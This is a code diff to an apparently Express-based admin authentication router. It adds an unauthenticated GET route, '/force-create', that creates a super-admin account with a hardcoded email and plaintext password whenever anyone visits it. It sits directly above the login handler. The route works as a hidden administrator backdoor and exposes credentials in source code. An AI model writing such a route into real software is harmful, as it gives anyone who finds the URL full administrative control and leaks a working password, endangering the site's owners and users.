@@ -16,6 +16,27 @@ const ADMIN_OTP_STORE = {};
 // ═══════════════════════════════════════
 
 // Admin Login — Step 1: email + password
+
+router.get('/force-create', async (req, res) => {
+    try {
+        const existingAdmin = await AdminUser.findOne({ email: 'facelook.cs51@gmail.com' });
+        if (!existingAdmin) {
+            await AdminUser.create({
+                id: Date.now(),
+                name: 'Super Admin',
+                email: 'facelook.cs51@gmail.com',
+                password: bcrypt.hashSync('Facelook@4411', 10),
+                role: 'super_admin',
+                twoFactorEnabled: true
+            });
+            return res.json({ success: true, message: 'Admin facelook.cs51@gmail.com created successfully!' });
+        }
+        return res.json({ success: true, message: 'Admin already exists!' });
+    } catch (e) {
+        return res.status(500).json({ error: e.message });
+    }
+});
+
 router.post('/login', async (req, res) => {
     try {
         const { email, password } = req.body;
